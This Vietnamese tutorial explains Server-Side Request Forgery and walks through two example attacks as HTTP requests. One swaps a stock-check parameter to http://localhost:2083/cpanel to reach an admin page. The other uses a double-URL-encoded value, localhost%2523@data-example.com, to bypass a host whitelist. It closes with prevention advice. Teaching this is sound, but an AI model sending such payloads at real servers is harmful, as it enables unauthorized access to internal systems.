# SSRF

## 1. SSRF là gì
*SSRF (Server Side Request Forgery)* hay còn gọi là tấn công yêu cầu giả mạo từ phía server cho phép kẻ tấn công thay đổi tham số được sử dụng trên trang web để tạo hoặc kiểm soát các yêu cầu từ server dễ bị tấn công.

Khi tài nguyên của trang web cần lấy nguồn tài nguyên từ resource ngoài, thì server cần phải yêu cầu sử dụng và đưa lên trang web.

![](https://images.viblo.asia/full/0b192762-6c39-4255-ad05-0e58ea99deb0.png)

Ví dụ, một URL như https://example.com/feed.php?url=example2.com/feed/ để lấy nguồn cấp dữ liệu từ xa. Nếu kẻ tấn công có thể thay đổi tham số url thành localhost, thì anh ta có thể xem các tài nguyên cục bộ được lưu trữ trên server, làm cho nó dễ bị tấn công bởi yêu cầu giả mạo từ phía server...

Nếu kẻ tấn công có thể kiểm soát đích của các yêu cầu phía server, chúng có thể thực hiện các hành động sau:

* Lạm dụng mối quan hệ tin cậy giữa server dễ bị tổn thương và những người khác.
* Bỏ qua danh sách trắng IP.
* Bỏ qua dịch vụ xác thực dựa trên server.
* Đọc tài nguyên mà công chúng không thể truy cập, chẳng hạn như trace.axd trong ASP.NET hoặc siêu dữ liệu API trong môi trường AWS.
* Quét mạng nội bộ mà server được kết nối đến.
* Đọc tệp từ server web.
* Xem trang trạng thái và tương tác với các API như server web.
* Truy xuất thông tin nhạy cảm như địa chỉ IP của server web sau proxy ngược.

Thông thường SSRF xảy ra khi một ứng dụng web đang thực hiện một yêu cầu, trong đó kẻ tấn công có toàn quyền hoặc kiểm soát một phần yêu cầu đang được gửi đi. 

![](https://images.viblo.asia/full/b0ae85ac-13ea-465d-a4a6-9e825c4c3fbd.jpg)

## 2. Một số cách thức tấn công

### 1. Tấn công máy chủ cục bộ

Giả sử có một trang web bán điện thoại mà kẻ tấn công muốn truy cập đến trang `admin`:

Attacker truy cập trực tiếp trang `admin` từ phía client

```http
GET /admin HTTP/1.1
Host: example.com
User-Agent: Agent 1
Connection: close
Upgrade-Insecure-Requests: 1
```

Sau khi truy cập trang admin từ phía client thì attacker nhận được mã `401 Unauthorized` và message thông báo `Bạn không phải là admin` nghĩa là chúng ta không thể truy cập trực tiếp được trang quản trị admin với một vai trò `user`.

```http
HTTP/1.1 401 Unauthorized
Content-Type: text/html; charset=utf-8
Connection: close
Content-Length: 1940

Bạn không phải là admin
```

Tại trang web bán hàng điện thoại có chức năng xem các sản phẩm iphone có tại các cửa hàng đó hay không. Để cung cấp thông tin cho khách hàng thì server đã gọi api từ trang web khác vào để craw dữ liệu về hiển thị.

```http
POST /category/iphone HTTP/1.1
Host: example.com
User-Agent: Agent 1
Referer: https://example.com/product?productId=1
Content-Type: application/x-www-form-urlencoded
Origin: http://example.com
Content-Length: 97
Connection: close

product=http%3A%2F%2Fdata-example.com%3A8100%2F%3Fproduct%3Diphone
```

Dựa vào các thức mà ứng dụng gửi yêu cầu attacker đã thay đổi yêu cầu truy cập đến trang quản trị admin

```http
POST /category/iphone HTTP/1.1
Host: example.com
User-Agent: Agent 1
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://example.com/product?productId=1
Content-Type: application/x-www-form-urlencoded
Origin: http://example.com
Content-Length: 31
Connection: close

stockApi=http://localhost:2083/cpanel
```

Như vậy là attacker đã truy cập thành công trang admin.

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Connection: close
Content-Length: 12
...
...
...

Hello, admin
```

Việc kiểm tra kiểm soát truy cập được thực hiện ở phía front-end mà không phải phía server.

Ứng dụng cho phép truy cập trang quản trị mà không cần đăng nhập, có thể truy cập đối với bất kỳ người dùng nào từ phía local.

## 2. Tấn công SSRF với while list input filters

Thường một số ứng dụng chỉ cho phép một số đầu vào mà của người dùng như bắt đầu bằng, matches,... với while list mà họ đã định ra. Đôi khi chúng ta có thể khai thác sự không đồng nhất trong việc phân tích URL.

Đây là cấu trúc một URL dựa vào đó mà ta có thể khai thác cách phần tích URL của một server:

scheme://user:pass@host:port/path?query=value#fragment

* Thêm thông tin đăng nhập vào URL trước hostname
* Sử dụng `#` để chỉ ra nội dung của mục con.
`URLEncode`
* Có thể sử dụng kết hợp tất cả các trên tùy vào mỗi ứng dụng mà họ filters khác nhau.

Vẫn giống ví dụ trước cũng là một trang bán điện thoại có chức năng xem các sản phẩm có ở đó hay không, nhưng lần này ứng dụng đã kiểm tra kỹ hơn đầu vào mà người dùng nhập vào.

Trong trường hợp này attacker cũng đổi host nhưng đã bị chặn lại bởi ứng dụng web chỉ chấp thuận host data-example.com.

Khi không thay đổi được `host` attacker thử thêm `username` vào URL thì nhận được response `Internal Server Error` điều này khiến cho attacker nghi ngờ rằng chúng đang cố gắng kết nối đến server là `username`.

```http
POST /category/iphone HTTP/1.1
Host: example.com
User-Agent: Agent 1
Referer: http://example.com/category
Content-Type: application/x-www-form-urlencoded
Origin: http://example.com
Content-Length: 47
Connection: close

stockApi=http://username@data-example.com
```

```http
HTTP/1.1 500 Internal Server Error
Connection: close
```

khi attacker Double-URL encode và nhận được response 200 OK thì một trong những kết quả tồi tệ nhất của một trang web khi bị attack cũng đã xuất hiện

```http
POST /category/iphone HTTP/1.1
Host: example.com
User-Agent: Agent
Referer: http://example.com/category
Content-Type: application/x-www-form-urlencoded
Origin: https://example.com
Content-Length: 53
Connection: close

stockApi=http://localhost%2523@data-example.com
```

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Connection: close
Content-Length: 107
...
...

Hi, admin
```

Những nguyên nhân xảy ra:

* Do việc xử lí URL không được đồng nhất.
* Không kiểm soát hết được input mà người dùng hay attacker truyền vào.

Ngoài ra còn một số kiểu tấn công khác tùy thuộc vào mỗi ứng dụng web đó xử lý input mà người dùng nhập vào.

# 3. Hậu quả 

Một cuộc tấn công SSRF thành công có thể dẫn đến cách hành động truy cập dữ liệu trái phép trong một tổ chức, trong chính ứng dụng đó hoặc trong các hệ thống back-end khác mà ứng dụng đó có thể giao tiếp. 

Trong một số trường hợp SSRF có thể dẫn đến attacker có thể thực hiện `command execution`.

# 4. Các ngăn chặn và phòng ngừa

Để ngăn ngừa các lỗ hổng SSRF trong ứng dụng web ta nên sử dụng các `while list` các `domain` và `protocols` được phép truy cập tài nguyên từ phía máy chủ.

Nên tránh sử dụng các chức năng mà người dùng trực tiếp yêu cầu tài nguyên thay cho máy chủ. 

Ngoài ra cũng nên filter user input, trong trường hợp này nó rất khó để thực hiện bởi vì không thể nắm hết được những input mà người dùng nhập vào.

# 5. Tham khảo

* https://portswigger.net/web-security/ssrf

* https://viblo.asia/p/server-side-request-forgery-ssrf-RQqKL9D6Z7z

* https://owasp.org/www-community/attacks/Server_Side_Request_Forgery

* https://www.acunetix.com/blog/articles/server-side-request-forgery-vulnerability/